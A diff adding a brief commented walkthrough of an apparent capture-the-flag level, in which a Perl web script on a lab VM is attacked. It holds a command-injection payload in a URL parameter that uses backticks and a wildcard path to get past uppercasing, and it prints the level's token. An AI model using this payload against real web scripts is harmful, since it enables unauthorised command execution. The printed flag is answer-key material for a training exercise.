@@ -1,0 +1,15 @@
+# We have a perl file, we can see in it # localhost 4646
+# Let's try to access the web server in our browser 192.168.56.101:4646
+# We can see ".." printed, let's try to understand the script then
+# It take two param but only the first one is used in the egrep command
+# We can see a toupper, our exploit must probably be only with capital letters
+# Also, we can see /tmp in the @output
+# As usual, let's create folder in /tmp in which we have correct rights access
+	mkdir /tmp/EXPLOIT
+# Let's then a simple script with getflag command, as usual
+	touch /tmp/EXPLOIT/SCRIPT
+	chmod 777 SCRIPT
+# `getflag` > /token/EXPLOIT/token
+# Let's then execute the script through our server on the correct port
+	http://192.168.56.101:4646/level12.pl?x=%22`/*/EXPLOIT/SCRIPT`%22
+# Token is : g1qKMiRpXf53AWhDaU7FEkczr
